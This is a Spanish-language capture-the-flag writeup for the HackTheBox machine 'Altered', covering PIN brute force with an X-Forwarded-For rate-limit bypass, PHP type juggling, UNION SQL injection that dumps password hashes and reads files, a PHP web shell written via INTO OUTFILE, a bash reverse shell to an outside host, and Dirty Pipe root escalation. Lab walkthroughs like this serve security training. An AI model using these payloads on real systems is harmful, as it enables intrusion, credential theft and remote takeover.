---
layout: post
toc: true
title: "Altered - HackTheBox Writeup"
categories: HackTheBox
tags: [CTF, Web]
author:
  - H4RRIZN
---
![altered](https://i.postimg.cc/fTVWvKrR/altered.png)

## Reconocimiento Inicial
Como siempre para comprobar que tenemos conexión entre nuestra maquina de atacante y el host victima enviamos una traza ICMP. Comprobamos de que el host se encuentra activo:
![icmp](https://i.postimg.cc/g2x2sPN5/icmp.png)

A continuación realizamos un scan con nmap para visualizar los puertos que se encuentren abiertos en el host:
![nmap1](https://i.postimg.cc/y6Sd0Kpb/nmap.png)

Tenemos el puerto 22, 80 abierto. Realizamos otro scan con nmap para detectar la versión de los servicios:
![nmap2](https://i.postimg.cc/ydDFFG2y/nmap2.png)

## Reconocimiento Web
El scan anterior revelo que el puerto 80 esta habilitado utilizando un servidor nginx. Podemos ingresar a este desde el navegador web:
![login1](https://i.postimg.cc/Nfcdcg3h/login1.png)

Vemos que tenemos un panel de Login. Intentamos realizar las típicas comprobaciones de usuarios y contraseñas por defecto como test;test:
![login2](https://i.postimg.cc/PqXxs84L/login2.png)

Esto nos entrega el mensaje de **Invalid Username**, lo que puede ser un mensaje genérico que nos permita enumerar usuarios. Ahora probamos con admin;admin:
![login3](https://i.postimg.cc/V6jmJfDy/login3.png)

En este caso vemos que el mensaje es **Invalid Password**. Además vemos un botón de **Forgot Password?** que al presionar observamos que se nos solicita un usuario. Utilizaremos el de admin en este caso ya que sabemos que es un usuario que existe:
![fp](https://i.postimg.cc/T30f8LZN/forgot-pass.png)

Al presionar en **submit** se nos redirige a *http://10.10.11.159/reset* en donde se nos muestra el mensaje de **"Enter the pincode emailed to you"**. Lo que nos indica que se nos ha enviado un código PIN al email:
![pin](https://i.postimg.cc/QttMYkCq/pin1.png)

Al probar con el código 1234 el cual resulta ser invalido se nos muestra el mensaje **"Invalid Pincode. Be sure to use the same browser you requested from."**. Si observamos la petición submit *proxeada* con BurpSuite podemos identificar que esta petición arrastra 2 cookies `laravel_session` y `XSRF-TOKEN`:
![prox1](https://i.postimg.cc/HxCqVpD8/prox1.png)

## PIN Brute Force
Observamos que se realiza una petición con el método `POST` en `/api/resettoken`.  Utilizamos Intruder para recorrer el pin desde el 0000 al 9999 para poder obtenerlo mediante fuerza bruta:
![429brute](https://i.postimg.cc/WbJx6FNq/409burte.png)

Pero vemos que luego de algunas peticiones el código de estado es **429**. Lo que significa que hemos realizado demasiadas peticiones.

### Rate Limit Bypass
Existen diversas formas de realizar un bypass cuando el servidor bloquea nuestras peticiones, pero mi favorita es utilizar la cabecera **`X-Forwarded-For`** para hacer pasar la petición original por otra IP. Lo ideal es tener un diccionario de IPs para poder irlas rotando en la cabecera **`X-Forwarded-For`**. Podemos crear un diccionario de IPs con el siguiente script en python:
```python
for i in range(51):
    for j in range(251):
        print(f"10.10.{i}.{j}")
```
![ipgen](https://i.postimg.cc/Zq1wqjNf/ipgen.png)

En el diccionario ya contamos con más de 12000 ips distintas para realizar el ataque. Utilizaremos Intruder de BurSuite para realizar un ataque de tipo **`Pitchfork`** sobre **`/api/resettoken`** en la cual agregaremos la cabecera **`X-Forwarded-For`** con un valor aleatorio que recorreremos con el diccionario creado y además recorreremos nuevamente la lista de posibles PIN:
![pitchfork](https://i.postimg.cc/1tdsXkHk/pitchfork.png)

Configuramos el payload 1 seleccionado el tipo en Simple list y cargamos el diccionario en Load:
![pay1](https://i.postimg.cc/MHsPzwmB/pay1.png)

El Payload 2 lo configuramos igual al primer ataque realizado con Intruder:
![pay2](https://i.postimg.cc/XJqBT0qm/pay2.png)

Iniciamos el ataque y observamos que ahora todas las peticiones son código de estado `**200**`
![200brute](https://i.postimg.cc/YSqxqZjf/200brute.png)

Al finalizar el ataque podemos identificar que tenemos una petición con una longitud inferior a la del resto el cual corresponde al PIN 9933:
![pinbrute](https://i.postimg.cc/T3kDQwYg/pinbrute.png)

Si seguimos esta petición en el navegador podemos observar que ahora somos capaces de cambiar la contraseña. Para este caso la contraseña sera **"h4rri"**:
![changepass](https://i.postimg.cc/V6KpkXY5/cp.png)

Y al dar a **`Submit`** observamos que hemos cambiado la contraseña ya que se refleja el mensaje **“Password Changed”**
![passchanged](https://i.postimg.cc/1X6dc2GV/passchanged.png)

## Login as Admin
Ahora si utilizamos las credenciales para iniciar sesión podremos ver que lo hacemos como el usuario admin:
![login](https://i.postimg.cc/m2Bj5PR5/login4.png)

Al presionar en **`view`** en cualquier *Profile* se nos muestra un mensaje correspondiente al perfil del usuario:
![profile_view](https://i.postimg.cc/hj0zzPwX/profile.png)

Al observar las peticiones de esta interración en Burp nos fijamos que se revela el campo **`id`** y **`secret`** que se están obteniendo mediante **`GET`**:
![getparams](https://i.postimg.cc/YC1pqDT9/getparams.png)

Enviaremos esta petición al **Repeater** para modificar ambos campos, Al hacer esto observamos que se nos muestra el mensaje de “**Tampered user input detected**”:     
![tampered1](https://i.postimg.cc/dt9YbZCk/tampered.png)

Al modificar cualquiera de los dos campos se presenta el mensaje de error de la captura anterior. Lo que me indica que algo esta detectando que los campos se están modificando. Podemos probar cambiando el método de **`GET`** a **`POST`**:
![methodchanged](https://i.postimg.cc/hPDw7yJv/methodchange.png)

Al realizar esto observamos un mensaje de error en formato **`json`** con esto en mente adaptamos el formato a **`json`** y cambiamos también el contenido de la cabecera **`Content-Type`**:
![ctype](https://i.postimg.cc/BbLjhcbK/ctype.png)

Vemos que el mensaje de error sigue siendo el mismo, probaremos cambiando al método **`GET`** nuevamente:
![getagain](https://i.postimg.cc/05bcSzPg/getagain.png)

Y como se ve ahora si se visualizar el contenido original de la respuesta. Además hay que tener en cuenta que los datos se están enviando en formato **`json`**. 
Si volvemos a modificar los datos con el formato entregado veremos lo siguiente:
![tampered2](https://i.postimg.cc/dt9YbZCk/tampered.png)

Por lo que debemos realizar una evasión sobre estas validaciones.
## Type Juggling
Si pensamos en como esta construido el código del servidor debemos saber que lenguaje esta utilizando. Para esto generalmente utilizo Wappalyzer o whatweb para CLI:     
![wapa](https://i.postimg.cc/pV6ccDqX/wapa.png)

Y vemos que la aplicación utiliza como lenguaje de programación PHP.
Realizando pruebas sobre los parámetros agregando datos debemos determinar si esa comparación se hace con **`==`** y no **`===`**, el Type Juggling evitaría la comprobación. Probamos cambiar **`secret`** a **`true`**:    
![tj1](https://i.postimg.cc/RVCft8cW/tj1.png)

Acabamos de abusar de esta característica al manipular los datos de entrada de una aplicación PHP para realizar comparaciones que resulten en valores inesperados o falsos positivos, lo que puede conducir a vulnerabilidades de seguridad como la inyección de SQL o la omisión de autenticación.
Incluso se acepta como cadena. Lo que refuerza la probabilidad de SQL Injection:    
![sqlidetect](https://i.postimg.cc/mZPhGsNN/sqlidetect.png)

## SQL Injection
Modificaremos el valor del parámetro **id** para ingresando una comilla simple para detectar si se produce algún error de sintaxis de SQL:   
![sqli_detected](https://i.postimg.cc/3JyG9Gch/sqlidetect.png)

Como vemos se produce un error y el servidor responde con un código de estado **500**. Realizamos un ordenamiento por columnas para determinar la cantidad de estas en la tabla:   
![orderby4](https://i.postimg.cc/1X1zHgnm/orderby4.png)

Como se aprecia al ordenar por 4 el error persiste. Caso contrario si ordenamos por 3 volveremos a visualizar el texto del perfil en cuestión:
![ordby3](https://i.postimg.cc/CxqQyzzT/orderby3.png)

Desde este punto podemos probar realizando una inyección SQL basada en UNION:
![sqlunion](https://i.postimg.cc/7hknc8Kg/sqlunion.png)

La sintaxis funciona pero no vemos reflejado ninguno de los 3 valores.
Observamos que si cambiamos el valor **`8`** del **`id`** por una cadena envuelta en comillas simples vemos reflejado el valor 3:
```sql
"'H4RR1' UNION SELECT 1,2,3-- -"
```
![sqlsintax](https://i.postimg.cc/LshSqGBB/sqlsintax.png)

### Enumeración de la BD
Vemos que la base de datos en uso es **uhc**:     
![bd](https://i.postimg.cc/8zZJgQzh/bd.png)

Ahora enumeraremos las tablas de esta base de datos:
```sql
UNION SELECT 1,2,GROUP_CONCAT(table_names) FROM information_schema.tables WHERE table_schema='uhc'
```
![bdenum](https://i.postimg.cc/y6pbxWp5/bdenum.png)

Y vemos la tabla de interés **`users`**. Por lo que procedemos a enumerarla:
```sql
UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users'
```

![userstb](https://i.postimg.cc/Hxq307Gs/userstb.png)
Desde este punto creamos una query para extraer el contenido de las columnas **`name`** y **`password`**:    
```sql
UNION SELECT 1,2,GROUP_CONCAT(name,':',password,'\n') FROM uhc.users-- -
```
![passdb](https://i.postimg.cc/9fq7dgcZ/passdb.png)
```sql
big0us:$2y$10$L3X8m6P1w.F2aO011ffWr.587vGCYeFXuXwE2vr3DbrYkcuF741N2
,celesian:$2y$10$8ewqN3lE9iazbo8sFiwUleeNIbOpAMRcaMzeiXJ50wlItN2Kd5pI6
,luska:$2y$10$KdZCbzxXRsBOBHI.91XIz.O.lQQ3TqeY8uonzAumoAv6v9JVQv3g.
,tinyb0y:$2y$10$X501zxcWLKXf.OteOaPILuhMBIalFjid5bBjBkrst/cynKL/DLfiS
,o-tafe:$2y$10$XIrsc.ma/p0qhvWm9.sqyOnA5184ICWNverXQVLQJD30nCw7.PyxW
,watchdog:$2y$10$RTbD7i5I53rofpAfr83YcOK2XsTglO01jVHZajEOSH1tGXiU8nzEq
,mydonut:$2y$10$7DFlqs/eXGm0JPVebpPheuEx3gXPhTnRmN1Ia5wutECZg1El7cVJK
,bee:$2y$10$Furn1Q0Oy8IbeCslv7.Oy.psgPoCH2ds3FZfJeQlCdxJ0WVhLKmzm
,admin:$2y$10$37Q1SanFMybo1MXUncgI1uYt5G1KdqaHMWlBjcY7i63aGcluXNrfu
```

Vemos que las contraseñas estan hasheadas. No probaremos crackearlas e intentar ingresar por SSH.

### Leyendo ficheros internos
Podemos enumerar ficheros internos con la vulnerabilidad de SQLi mediante el comando **`LOAD_FILE`**

```sql
UNION SELECT 1,2,LOAD_FILE('/etc/passwd')-- -
```
![pswd](https://i.postimg.cc/RVk93gpj/passwd.png)

Podemos probar enumerar la clave privada de SSH del usuario:     
![rsafail](https://i.postimg.cc/Fzf5zSyr/idrsafail.png)

### Web Shell via SQLi 
Podemos probar una técnica para subir una web shell desde la consulta SQL. Primero debemos saber en que ruta reside el servidor, sabemos que el servidor es un nginx. Entonces podemos probar con rutas de servidores nginx como **`/etc/nginx/sites-enabled/default`**:    
![nginx](https://i.postimg.cc/90HKmkQp/nginx.png)

Observamos que se revela la ruta **`/srv/altered/public`**. Quiero pensar que tengo permiso de escritura por lo que subire una webshell de la siguiente forma:  
```sql
UNION SELECT 1,2,<?php system($_REQUEST[\"cmd\"]); ?> into outfile '/srv/altered/public/wse.php'-- -
```
![wshell](https://i.postimg.cc/WzpmwmWV/wshell.png)

Al ingresar en la url el nombre asignado a la webshell *“wse.php”* observamos que se reflejan los valores 1, 2 y el valor donde debería ir 3 se ve vacío:     
![wse](https://i.postimg.cc/TwN1Br2f/wse1.png)

Pasamos el parámetro cmd por la url y podremos ejecutar comandos:
![wse2](https://i.postimg.cc/bvN2MY00/wse2.png)

## Reverse shell as www-data
Ya que podemos ejecutar comandos utilizare una reverse shell simple en bash:

```sql
bash -c "bash -i >& /dev/tcp/10.10.14.24/443 0>&1"
Posteriormente la URL-Encodeamos:
%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%32%34%2f%34%34%33%20%30%3e%26%31%22
```

Al enviar el comando en el navegador y al estar a la escucha con netcat vemos que recibimos la shell:     
![revwww](https://i.postimg.cc/nLGG9cZN/revaswww.png)
### Tratamiento TTY
Para avanzar cómodamente realizaremos el tratamiento de la tty para obtener una consola interactiva. Escribimos la siguiente secuencia de comandos para poder obtener una consola interactiva o fully tty:     
```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
```
![tty](https://i.postimg.cc/CLZpgdVh/tty.png)

## Escalando privilegios
Para escalar privilegios en un host linux podemos utilizar herramientas como LinPeas para automatizar esta parte. Generalmente comienzo por enumerar el kernel del sistema:    
![kernel](https://i.postimg.cc/VNj939Nx/Kernel.png)

Vemos que la versión de kernel es la **5.16.0.-051600-generic**. Si buscamos exploits relacionados a este encontraremos el CVE-2022-0847 el cual corresponde a una escalada local de privilegios (Dirty Pipe).

Buscando un exploit podemos dar con el siguiente, que requiere de un SUID para funcionar:
[Exploit](https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c)

Ahora debemos buscar permisos SUID en binarios del sistema:
```bash
find / -perm -4000 2>/dev/null
```
![suid](https://i.postimg.cc/y6JhKzWh/suid.png)
Podemos ver que esta el binario de **`pkexec`**. Con el cual podemos intentar aprovecharnos para escalar privilegios. 
Descargamos el exploit en nuestra maquina de atacante y lo compilamos con **`gcc -o exploit-2 exploit-2.c`**:        
![gcc](https://i.postimg.cc/fWKsM1FL/exploit.png)

Ahora montamos un servidor con python para poder descargarlo en el host victima:     
![sv](https://i.postimg.cc/GtSSHPGM/server.png)
![expdown](https://i.postimg.cc/4df8P21L/Exploit-downloaded.png)
Ahora le damos permisos de ejecución al binario y lo ejecutamos llamando el SUID **`/usr/bin/pkexec`:**:     
![exploited](https://i.postimg.cc/HWPS028z/exploited.png)
Con esto conseguimos ser usuario root y leer la flag:   
![pwn](https://i.postimg.cc/15GvxZYC/root.png)

Pwned! 🏴‍☠️